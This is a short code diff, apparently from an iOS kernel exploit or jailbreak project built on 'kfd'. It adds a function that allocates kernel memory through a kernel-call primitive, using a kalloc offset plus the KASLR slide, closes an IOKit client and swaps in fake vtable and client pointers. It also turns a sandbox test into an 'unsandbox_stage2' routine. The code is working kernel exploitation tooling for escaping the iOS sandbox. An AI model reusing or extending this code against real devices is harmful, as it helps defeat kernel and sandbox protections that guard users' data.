@@ -349,8 +349,30 @@ int prepare_kcall(void) {
     return 0;
 }
 
-void sandbox_test(void) {
-    NSString* save_path = @"/private/var/mobile/kfd-arm64.plist";
+int kalloc_using_empty_kdata_page_stage2(void) {
+
+    //init_kcall();
+
+    uint64_t allocated_kmem[2] = {0, 0};
+    allocated_kmem[0] = zm_fix_addr_kalloc(mineek_kcall(off_kalloc_data_external + get_kslide(), 0x1000, 1, 0, 0, 0, 0, 0));
+    allocated_kmem[1] = zm_fix_addr_kalloc(mineek_kcall(off_kalloc_data_external + get_kslide(), 0x2000, 1, 0, 0, 0, 0, 0));
+
+    IOServiceClose(user_client);
+    user_client = 0;
+    usleep(10000);
+
+    clean_dirty_kalloc(fake_vtable, 0x1000);
+    clean_dirty_kalloc(fake_client, 0x2000);
+    
+    fake_vtable = allocated_kmem[0];
+    fake_client = allocated_kmem[1];
+    printf("fake_vtable: 0x%llx, fake_client: 0x%llx\n", fake_vtable, fake_client);
+
+    return 0;
+}
+
+void unsandbox_stage2(void) {
+    NSString* save_path = @"/tmp/kfd-arm64.plist";
     if(access(save_path.UTF8String, F_OK) == 0) {
         NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
         fake_vtable = [dict[@"kcall_fake_vtable_allocations"] unsignedLongLongValue];
